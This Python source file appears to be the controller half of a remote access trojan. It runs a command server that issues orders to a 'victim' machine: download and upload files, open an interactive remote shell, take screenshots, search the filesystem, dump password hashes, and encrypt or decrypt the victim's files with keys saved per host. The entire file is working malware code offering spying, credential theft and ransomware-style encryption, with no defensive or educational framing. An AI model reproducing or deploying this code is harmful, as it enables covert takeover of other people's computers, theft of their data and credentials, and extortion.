#!/usr/bin/python3
from secure_socket import Server
from sys import argv
import os
from os.path import isfile
import ipaddress
from aes_cbc_256 import AES_CBC_256

def help():
  print("""
COMMANDS :

  help                   Display this.
  download               Get a file from the victim.
  upload                 Put a file on the victim.
  shell                  Start a shell on the victim.
  ipconfig               Display the victim's IP configuration.
  screenshot      file   Take a screenshot from the victim's screen and saves it as {file}.png.
  search   [path] file   Find the location of a file in a directory, defaults to root directory.
  hashdump               Dump the sensitive data about users and passwords.
  encrypt                encrypts a file or directory on the victim's computer
  decrypt                decrypts a file or directory on the victim's computer
  exit                   Let the victim go.
""")

def ipconfig(victim):
  victim.send('ip')
  print(victim.receive())

def clear():
  os.system('cls' if os.name == 'nt' else 'clear')

def search(victim, filename, path):
  victim.send('search')
  victim.send(' '.join([filename,path]))
  result = (victim.receive())
  if result == "":
    print("File not found")
  else:
    print(result)

def screenshot(victim,filename):
  victim.send('screenshot')
  victim.send(filename)
  victim.receive_file()

def hashdump(victim):
  victim.send('hashdump')
  print(victim.receive())

def shell(victim):
  victim.send('shell')
  prompt=victim.receive()
  cmd=input(prompt)
  while cmd!='exit':
    victim.send(cmd)
    prompt_out=victim.receive(as_bytes=True)
    # * is separator between prompt and output
    out=b"*".join(prompt_out.split(b'*')[1:])
    try:
      out=out.decode()
    except UnicodeDecodeError:
      pass
    prompt=prompt_out.split(b'*')[0].decode()
    if out!='':
      # dont print too much \n
      if out[-1]=="\n":
        print(out[:-1])
      else:
        print(out)
    cmd=input(prompt)
  victim.send('exit')

def upload(victim):
  filename_src=input('file to send => ')
  filename_dst=input('with name => ')
  if not os.path.isfile(filename_src):
    print('File not found.')
    return
  victim.send('upload')
  victim.send_file(filename_src, filename_dst)
  print('done.')

def download(victim):
  victim.send('download')
  filename_src=input('file to get => ')
  filename_dst=input('new name => ')
  # knowing * char is not allowed in filenames, it can be used as separator.
  victim.send(f"{filename_src}*{filename_dst}")
  ret=victim.receive()
  print(ret)
  if ret!='File not found.':
    victim.receive_file()

def get_key(hostname):
  filename=f"{hostname}.key"
  if not isfile(filename):
    AES_CBC_256.save_key(AES_CBC_256.generate_key(), filename)
  return AES_CBC_256.load_key(filename)

def encrypt(victim):
  filename=input('file or dir to encrypt => ')
  victim.send('encrypt')
  hostname=victim.receive()
  key=get_key(hostname)
  victim.send(key, as_bytes=True)
  print(f"filename sent :{filename.encode()}")
  victim.send(filename)
  print(victim.receive())

def decrypt(victim):
  filename=input('file or dir to decrypt => ')
  victim.send('decrypt')
  hostname=victim.receive()
  key=get_key(hostname)
  victim.send(key, as_bytes=True)
  print(f"filename sent :{filename.encode()}")
  victim.send(filename)
  print(victim.receive())

def run_command(server, cmd):
  command=cmd.split(" ")[0]
  match command:
    case 'help':
      help()
    case 'download':
      download(server)
    case 'upload':
      upload(server)
    case 'shell':
      shell(server)
    case 'ipconfig':
      ipconfig(server)
    case 'screenshot':
      # remove spaces when user puts too many
      check = cmd.split(" ")
      while '' in check:
        check.remove('')
      if len(check) ==1:
        filename = "default"
      else:
        filename = check[1]
      screenshot(server,filename)
    case 'clear':
      clear()
    case 'cls':
      clear()
    case 'search':
      check = cmd.split(" ")
      # if user just inputs a filename:
      if len(check) ==2 and not "" in check:
        name = check[1]
        if os.name =='nt':
          path = 'C:\\'
        else:
          path= "/"
        search(server,name,path)
      # if user also specifies a path where to search:
      elif len(check) ==3 and not "" in check :
        path = check[1]
        name = check[2]
        search(server,name,path)
      else:
        print("search file [path] Find the location of a file in a directory, defaults to root directory.")
    case 'hashdump':
      hashdump(server)
    case 'encrypt':
      encrypt(server)
    case 'decrypt':
      decrypt(server)
    case '':# if user hits enter mistakenly
      pass
    case 'exit':
      return False
    case _: # else print unknown
      print(f"Unknown command : {command}")
  return True

if __name__ == "__main__":
  host="127.0.0.1"
  try:
    # verify ip is valid
    ipaddress.ip_address(argv[1])
    host=argv[1]
  except:
    print("The IP adress is not valid.\nUsage: python server.py IPADDRESS")
    exit(1)
    
  server=Server(run_command, host=host)
  try:
    server.run()
  except KeyboardInterrupt:
    print("\r Server stopped.")
  finally:
    server.stop()
